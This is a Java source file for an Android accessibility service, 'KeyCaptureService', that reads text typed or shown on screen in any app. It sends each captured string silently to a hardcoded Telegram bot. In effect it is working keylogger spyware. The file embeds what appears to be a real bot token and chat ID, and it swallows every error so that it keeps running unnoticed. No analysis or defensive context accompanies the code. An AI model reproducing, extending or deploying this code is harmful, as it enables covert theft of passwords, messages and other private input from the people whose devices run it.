package com.example.myeye;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityEvent;
import android.util.Log;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.List;

public class KeyCaptureService extends AccessibilityService {

    private static final String TAG = "MyEyeService";
    private static final String BOT_TOKEN = "8114361873:AAFmtl8vD0Vo7CZvkVmwnjcZZxtzvZXqguY";
    private static final String CHAT_ID = "5022620385";
    private String lastCaptured = "";

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        try {
            AccessibilityServiceInfo info = new AccessibilityServiceInfo();
            info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED | AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
            info.flags = AccessibilityServiceInfo.FLAG_DEFAULT | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
            info.notificationTimeout = 50;
            setServiceInfo(info);
        } catch (Throwable t) {
            // Never crash on connection setup
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            if (event == null) return;
            
            List<CharSequence> textList = event.getText();
            if (textList == null || textList.isEmpty()) return;

            for (CharSequence seq : textList) {
                if (seq != null) {
                    String data = seq.toString().trim();
                    if (!data.isEmpty() && !data.equals(lastCaptured) && data.length() > 1) {
                        lastCaptured = data;
                        dispatchToTelegram(data);
                    }
                }
            }
        } catch (Throwable t) {
            // Absolute barrier: guarantees the system can never kill the service
        }
    }

    @Override
    public void onInterrupt() {
        // Required override
    }

    private void dispatchToTelegram(final String textPayload) {
        try {
            Thread thread = new Thread(new Runnable() {
                @Override
                public void run() {
                    HttpURLConnection connection = null;
                    try {
                        URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
                        connection = (HttpURLConnection) url.openConnection();
                        connection.setRequestMethod("POST");
                        connection.setRequestProperty("Content-Type", "application/json; charset=utf-8");
                        connection.setConnectTimeout(2500);
                        connection.setReadTimeout(2500);
                        connection.setDoOutput(true);

                        String cleanText = textPayload.replace("\"", "\\\"").replace("\n", " ");
                        if (cleanText.length() > 2500) {
                            cleanText = cleanText.substring(0, 2500);
                        }

                        String jsonBody = "{\"chat_id\":\"" + CHAT_ID + "\", \"text\":\"" + cleanText + "\"}";
                        
                        try (OutputStream os = connection.getOutputStream()) {
                            os.write(jsonBody.getBytes(StandardCharsets.UTF_8));
                        }
                        
                        connection.getResponseCode();
                    } catch (Throwable e) {
                        // Silent catch for any network glitches
                    } finally {
                        if (connection != null) {
                            try {
                                connection.disconnect();
                            } catch (Throwable ignored) {}
                        }
                    }
                }
            });
            thread.start();
        } catch (Throwable t) {
            // Fallback for thread creation limits
        }
    }
}
